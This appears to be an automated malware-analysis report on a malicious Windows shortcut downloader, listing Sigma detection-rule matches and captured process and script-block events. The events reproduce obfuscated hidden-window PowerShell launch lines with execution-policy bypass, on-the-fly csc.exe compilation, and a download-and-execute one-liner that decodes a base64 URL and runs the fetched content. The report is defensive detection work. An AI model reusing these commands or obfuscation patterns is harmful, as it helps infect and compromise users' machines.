sigma_analysis_results.rule_description: Detects suspicious PowerShell invocation with a parameter substring
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Daniel Bohannon (idea), Roberto Rodriguez (Fix)

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=PowerShell.EXE; Hashes=SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; Description=Windows PowerShell; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\system32\cmd.exe" /v /k "St^a^rT /M^in "" PO^w^eR^sh^e^ll -w h^id^D^e^N -nOL^oGO -N^Op -eP BYpasS -ENC^Od^e^D^C^OM^MAn^d " [TRUNCATED]; CommandLine=POweRshell  -w hidDeN -nOLoGO -NOp -eP BYpasS -ENCOdeDCOMMAnd " [TRUNCATED]; EventID=1; ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Change PowerShell Policies to an Insecure Level
sigma_analysis_results.rule_description: Detects changing the PowerShell script execution policy to a potentially insecure level using the "-ExecutionPolicy" flag.

match_context.values: @{Hashes=SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\system32\cmd.exe" /v /k "St^a^rT /M^in "" PO^w^eR^sh^e^ll -w h^id^D^e^N -nOL^oGO -N^Op -eP BYpasS -ENC^Od^e^D^C^OM^MAn^d " [TRUNCATED]; CommandLine=POweRshell  -w hidDeN -nOLoGO -NOp -eP BYpasS -ENCOdeDCOMMAnd " [TRUNCATED]; EventID=1; ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets - ScriptBlock
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs

match_context.values: @{ScriptBlockText=IEX ([TExT.EnCOdINg]::UTF8.GetSTrINg((Iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly91eXQxbjhkZWQ5ZmIzODAuY29tLzh6ZExIUw==")))).CoNtEnt)); Path=; ScriptBlockId=0d6904d2-ef2d-4efa-adde-0ee80480af6c; MessageTotal=1; MessageNumber=1; EventID=4104}

sigma_analysis_results.rule_description: Detects execution of "csc.exe" to compile .NET code. Attackers often leverage this to compile code on the fly and use it in other stages.

match_context.values: @{Hashes=SHA1=93CF877F5627E55EC076A656E935042FAC39950E,MD5=23EE3D381CFE3B9F6229483E2CE2F9E1,SHA256=4240A12E0B246C9D69AF1F697488FE7DA1B497DF20F4A6F95135B4D5FE180A57,IMPHASH=EE1E569AD02AA1F7AECA80AC0601D80D; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=csc.exe; Product=Microsoft\xae .NET Framework; Description=Visual C# Command Line Compiler; FileVersion=4.8.3761.0 built by: NET48REL1; ParentCommandLine=POweRshell  -w hidDeN -nOLoGO -NOp -eP BYpasS -ENCOdeDCOMMAnd " [TRUNCATED]; CommandLine="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\george\AppData\Local\Temp\w3ajjr2j\w3ajjr2j.cmdline"; EventID=1; ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Suspicious Execution of Powershell with Base64
sigma_analysis_results.rule_description: Commandline to launch powershell with a base64 payload

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=PowerShell.EXE; Hashes=SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; Description=Windows PowerShell; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\system32\cmd.exe" /v /k "St^a^rT /M^in "" PO^w^eR^sh^e^ll -w h^id^D^e^N -nOL^oGO -N^Op -eP BYpasS -ENC^Od^e^D^C^OM^MAn^d " [TRUNCATED]; CommandLine=POweRshell  -w hidDeN -nOLoGO -NOp -eP BYpasS -ENCOdeDCOMMAnd " [TRUNCATED]; EventID=1; ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=PowerShell.EXE; Hashes=SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; Description=Windows PowerShell; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\system32\cmd.exe" /v /k "St^a^rT /M^in "" PO^w^eR^sh^e^ll -w h^id^D^e^N -nOL^oGO -N^Op -eP BYpasS -ENC^Od^e^D^C^OM^MAn^d " [TRUNCATED]; CommandLine=POweRshell  -w hidDeN -nOLoGO -NOp -eP BYpasS -ENCOdeDCOMMAnd " [TRUNCATED]; EventID=1; ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description:
When C# is compiled dynamically, a .cmdline file will be created as a part of the process.
Certain processes are not typically observed compiling C# code, but can do so without touching disk.
This can be used to unpack a payload for execution

match_context.values: @{Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; EventID=11; TargetFilename=C:\Users\george\AppData\Local\Temp\w3ajjr2j\w3ajjr2j.cmdline}

attributes.magic: MS Windows shortcut, Has Working directory, Has command line arguments, Icon number=347, ctime=Thu Dec 31 23:59:59 1969, mtime=Thu Dec 31 23:59:59 1969, atime=Thu Dec 31 23:59:59 1969, length=0, window=hide

threat_severity.level_description: Severity HIGH because it was considered downloader. Other contributing factor was that it could not be run in sandboxes.
